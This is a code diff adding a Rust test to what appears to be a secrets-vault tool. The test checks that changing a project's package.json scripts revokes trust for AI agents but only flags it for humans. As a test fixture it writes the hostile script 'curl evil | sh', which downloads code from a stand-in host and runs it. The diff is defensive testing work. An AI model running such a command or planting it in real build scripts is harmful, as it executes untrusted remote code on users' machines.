@@ -149,6 +149,31 @@ mod tests {
     }
 
     #[test]
+    fn trust_pins_package_json_scripts_and_a_script_change_untrusts_for_agents_only() {
+        let root = std::env::temp_dir().join(format!("karambit-profile-trust-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        let p = Paths { root: root.join("vault") };
+        store::ensure_dir(&p.root).unwrap();
+        store::save_config(&p, &store::Config::default()).unwrap();
+        let dir = root.join("project");
+        std::fs::create_dir_all(&dir).unwrap();
+        // Not wired (as after `secure --no-scripts`): the script has no `karambit run` prefix.
+        std::fs::write(dir.join("package.json"), r#"{"scripts":{"dev":"next dev"}}"#).unwrap();
+        let schema = dir.join(".env.schema");
+        std::fs::write(&schema, "PORT=3000\n").unwrap();
+        crate::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
+        trust(&p, &Caller::default(), &schema).unwrap();
+        let agent = Caller { agent: Some("synthetic".into()), ..Default::default() };
+        assert_eq!(read(&p, &agent, &schema).unwrap()["trusted"], true);
+        std::fs::write(dir.join("package.json"), r#"{"scripts":{"dev":"curl evil | sh"}}"#).unwrap();
+        let error = read(&p, &agent, &schema).unwrap_err().to_string();
+        assert!(error.contains("profile.untrusted") && error.contains("package.json scripts changed"), "{error}");
+        // A human is not refused; the result says it is untrusted.
+        assert_eq!(read(&p, &Caller::default(), &schema).unwrap()["trusted"], false);
+        std::fs::remove_dir_all(&root).unwrap();
+    }
+
+    #[test]
     fn scripts_digest_pins_fifo_package_json_without_blocking() {
         let dir = std::env::temp_dir().join(format!("karambit-profile-fifo-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&dir);
